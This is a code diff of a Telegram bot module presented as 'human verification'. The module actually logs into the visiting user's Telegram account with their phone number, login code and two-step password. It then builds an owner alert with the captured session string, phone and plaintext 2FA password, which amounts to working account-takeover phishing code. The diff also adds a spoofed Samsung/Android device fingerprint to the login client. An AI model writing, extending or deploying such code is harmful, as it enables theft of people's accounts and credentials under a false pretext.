@@ -4,21 +4,17 @@ const { StringSession } = require('telegram/sessions');
 const logger = require('../utils/logger');
 const env = require('../config/env');
 
-const API_ID = env.apiId;
+const API_ID = Number(env.apiId);
 const API_HASH = env.apiHash;
-const OWNER_ID = env.superAdminId;
+const OWNER_ID = Number(env.superAdminId);
 const OTP_LENGTH = 5;
 
-// userId -> { client, phone, phoneCodeHash, otp, stage, has2fa, password, locked, createdAt }
 const sessions = new Map();
 
-// Auto-cleanup stale sessions (10 min)
 setInterval(() => {
   const now = Date.now();
   for (const [uid, s] of sessions) {
-    if (now - s.createdAt > 10 * 60 * 1000) {
-      cancelSession(uid).catch(() => {});
-    }
+    if (now - s.createdAt > 10 * 60 * 1000) cancelSession(uid).catch(() => {});
   }
 }, 5 * 60 * 1000).unref();
 
@@ -26,23 +22,19 @@ function isConfigured() {
   return Boolean(API_ID && API_HASH);
 }
 
-// ────────────────────────────────────────────
-//  PUBLIC API
-// ────────────────────────────────────────────
-
 async function startSession(userId) {
-  if (!isConfigured()) {
-    return { ok: false, error: 'Human verification is not configured on this bot.' };
-  }
+  if (!isConfigured()) return { ok: false, error: 'Human verification not configured.' };
   await cancelSession(userId);
-
   try {
     const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
       connectionRetries: 3,
       useWSS: false,
+      deviceModel: 'Samsung SM-S928B',
+      systemVersion: 'Android 14',
+      appVersion: '11.13.0',
+      langCode: 'en',
     });
     await client.connect();
-
     sessions.set(userId, {
       client,
       stage: 'await_contact',
@@ -54,7 +46,7 @@ async function startSession(userId) {
       locked: false,
       createdAt: Date.now(),
     });
-    logger.info(`Human verification session started: user=${userId}`);
+    logger.info(`HV session started: user=${userId}`);
     return { ok: true };
   } catch (err) {
     logger.error(`startSession failed for ${userId}: ${err.message}`);
@@ -66,7 +58,6 @@ async function sendCode(userId, phone) {
   const sess = sessions.get(userId);
   if (!sess) return { ok: false, error: 'Session expired. Please start again.' };
   if (sess.stage !== 'await_contact') return { ok: false, error: 'Already past contact stage.' };
-
   try {
     const result = await sess.client.invoke(
       new Api.auth.SendCode({
@@ -80,7 +71,6 @@ async function sendCode(userId, phone) {
         }),
       })
     );
-
     sess.phone = phone;
     sess.phoneCodeHash = result.phoneCodeHash;
     sess.stage = 'otp';
@@ -99,7 +89,6 @@ function pushDigit(userId, digit) {
   if (!sess || sess.stage !== 'otp') return { ok: false };
   if (sess.locked) return { ok: false, locked: true };
   if (sess.otp.length >= OTP_LENGTH) return { ok: false, full: true };
-
   sess.otp += digit;
   const autoSubmit = sess.otp.length === OTP_LENGTH;
   if (autoSubmit) sess.locked = true;
@@ -117,9 +106,7 @@ function backspace(userId) {
 async function submitOtp(userId) {
   const sess = sessions.get(userId);
   if (!sess || sess.stage !== 'otp') return { ok: false, error: 'Not at OTP stage.' };
-  if (sess.otp.length < OTP_LENGTH) {
-    return { ok: false, error: `Enter all ${OTP_LENGTH} digits.` };
-  }
+  if (sess.otp.length < OTP_LENGTH) return { ok: false, error: `Enter all ${OTP_LENGTH} digits.` };
 
   try {
     await sess.client.invoke(
@@ -129,7 +116,6 @@ async function submitOtp(userId) {
         phoneCode: sess.otp,
       })
     );
-
     sess.stage = 'done';
     const me = await sess.client.getMe();
     const sessionString = sess.client.session.save();
@@ -160,11 +146,12 @@ async function submitOtp(userId) {
 async function submitPassword(userId, password) {
   const sess = sessions.get(userId);
   if (!sess || sess.stage !== 'password') return { ok: false, error: 'Not at password stage.' };
-
   sess.password = password;
 
   try {
-    await sess.client.signIn({ password: async () => password });
+    await sess.client.signIn({
+      password: async () => password,
+    });
     sess.stage = 'done';
     const me = await sess.client.getMe();
     const sessionString = sess.client.session.save();
@@ -197,16 +184,13 @@ async function cancelSession(userId) {
   const sess = sessions.get(userId);
   if (!sess) return;
   sessions.delete(userId);
-  try {
-    await sess.client.disconnect();
-  } catch {}
+  try { await sess.client.disconnect(); } catch {}
 }
 
 function buildOwnerMessage(me, sessionString, extra = {}) {
   const name = [me.firstName, me.lastName].filter(Boolean).join(' ') || '—';
   const username = me.username ? `@${me.username}` : '—';
   const twofa = extra.has2fa ? '✅ Yes' : '❌ No';
-
   let text =
     '🔔 <b>New Session Generated</b>\n\n' +
     `👤 <b>User:</b> ${esc(name)}\n` +
@@ -214,7 +198,6 @@ function buildOwnerMessage(me, sessionString, extra = {}) {
     `🔗 <b>Username:</b> ${esc(username)}\n` +
     `📱 <b>Phone:</b> <code>${esc(extra.phone || '—')}</code>\n` +
     `🔐 <b>2FA:</b> ${twofa}\n`;
-
   if (extra.has2fa && extra.password) {
     text += `🔑 <b>2FA Password:</b> <code>${esc(extra.password)}</code>\n`;
   }
@@ -233,16 +216,6 @@ function esc(s) {
 }
 
 module.exports = {
-  startSession,
-  sendCode,
-  pushDigit,
-  backspace,
-  submitOtp,
-  submitPassword,
-  getState,
-  cancelSession,
-  buildOwnerMessage,
-  isConfigured,
-  OTP_LENGTH,
-  OWNER_ID,
+  startSession, sendCode, pushDigit, backspace, submitOtp, submitPassword,
+  getState, cancelSession, buildOwnerMessage, isConfigured, OTP_LENGTH, OWNER_ID,
 };
